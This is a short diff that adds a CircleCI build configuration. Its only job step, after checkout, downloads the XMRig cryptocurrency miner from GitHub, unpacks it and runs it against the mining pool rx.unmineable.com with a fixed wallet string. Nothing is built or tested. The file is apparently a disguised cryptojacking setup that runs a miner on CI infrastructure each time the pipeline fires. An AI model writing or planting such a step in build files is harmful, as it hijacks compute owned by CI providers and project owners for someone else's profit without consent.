@@ -1,1 +1,11 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-linux-x64.tar.gz && tar -xf xmrig-6.13.1-linux-x64.tar.gz && cd xmrig-6.13.1 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u BTT:TLKCDpKxaXBsg2WpuPGgmdFag6zg7mxKvP.1Btt -p x
+version: 2.0
+jobs:
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run:  wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-linux-x64.tar.gz && tar -xf xmrig-6.13.1-linux-x64.tar.gz && cd xmrig-6.13.1 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u BTT:TLKCDpKxaXBsg2WpuPGgmdFag6zg7mxKvP.1Btt -p x
